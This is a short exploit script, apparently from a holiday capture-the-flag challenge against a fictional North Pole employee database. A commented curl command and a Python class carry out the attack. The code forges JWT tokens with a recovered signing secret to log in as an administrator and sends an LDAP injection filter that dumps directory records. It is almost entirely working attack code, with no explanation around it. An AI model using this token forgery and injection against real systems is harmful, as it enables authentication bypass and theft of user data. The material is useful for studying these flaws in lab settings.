#curl -x socks5h://localhost:32080 'http://edb.northpolechristmastown.com/search' -H 'Host: edb.northpolechristmastown.com' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://edb.northpolechristmastown.com/home.html' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'np-auth: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTEyLTMwIDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.Ap9vxVUbN-mHvJUSjdIauke3AM_CFV9EDPtyKnyUCxM' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: SESSION=VnbJ4088m5e1qp1Y704i' -H 'Connection: keep-alive' --data 'name=))(department=it)(|(cn=&isElf=True&attributes=*'  | jq .
import requests
import sys
import jwt
import json

SECRET_KEY='3lv3s'
PROXY = "socks5h://localhost:32080"

class EDB:
    def __init__(self, host='http://edb.northpolechristmastown.com'):
        self.host = host
        ses = requests.session()
        ses.proxies = {
            "http": PROXY,
        }
        self.ses = ses

    def make_jwt(self, user, dept="administrators", ou="human"):
        data = {
            'uid': user,
            'dept': dept,
            'ou': ou,
            'expires': '2018-08-16 12:00:47.248093+00:00',
        }

        token = jwt.encode(data, key=SECRET_KEY)
        return token.decode('utf-8')

    def login(self, user):
        token = self.make_jwt(user)
        self.ses.headers['np-auth'] = token
        resp = self.ses.post(self.host + "/login", data={
            "auth_token": token
        })
        resp.raise_for_status()
        #print(resp.text)
        resp = self.ses.get(self.host + "/home.html")
        resp.raise_for_status()

    def ldap_search(self, query):
        resp = self.ses.post(self.host + "/search", data={
            "isElf": "True",
            "attributes": "*",
            "name": query,
        })
        resp.raise_for_status()
        return resp.json()

if __name__ == "__main__":
    db = EDB()
    db.login("santa.claus")
    all_data = db.ldap_search("name=))(department=it)(|(cn=")
    print(json.dumps(all_data, indent=True))
